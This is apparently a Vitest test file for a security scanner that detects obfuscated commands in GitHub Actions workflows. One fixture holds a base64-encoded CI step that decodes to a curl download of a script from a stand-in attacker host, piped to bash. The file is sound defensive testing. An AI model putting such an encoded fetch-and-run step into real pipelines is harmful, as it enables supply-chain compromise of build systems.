import { describe, expect, it } from "vitest";
import { detectWorkflowObfuscation } from "../../src/layer2-static/detectors/workflow-obfuscation";

describe("workflow obfuscation detector", () => {
  it("flags encoded payload execution patterns", () => {
    const findings = detectWorkflowObfuscation({
      filePath: ".github/workflows/ci.yml",
      textContent: `on: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9wLnNoIHwgc2g=" | base64 -d | bash\n`,
      parsed: {
        on: ["push"],
        jobs: {
          build: {
            "runs-on": "ubuntu-latest",
            steps: [
              {
                run: 'echo "Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9wLnNoIHwgc2g=" | base64 -d | bash',
              },
            ],
          },
        },
      },
    });

    expect(findings).toHaveLength(1);
    expect(findings[0]?.rule_id).toBe("workflow-obfuscation");
  });

  it("does not flag straightforward non-obfuscated commands", () => {
    const findings = detectWorkflowObfuscation({
      filePath: ".github/workflows/ci.yml",
      textContent: `on: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n`,
      parsed: {
        on: ["push"],
        jobs: {
          build: {
            "runs-on": "ubuntu-latest",
            steps: [{ run: "npm test" }],
          },
        },
      },
    });

    expect(findings).toHaveLength(0);
  });
});
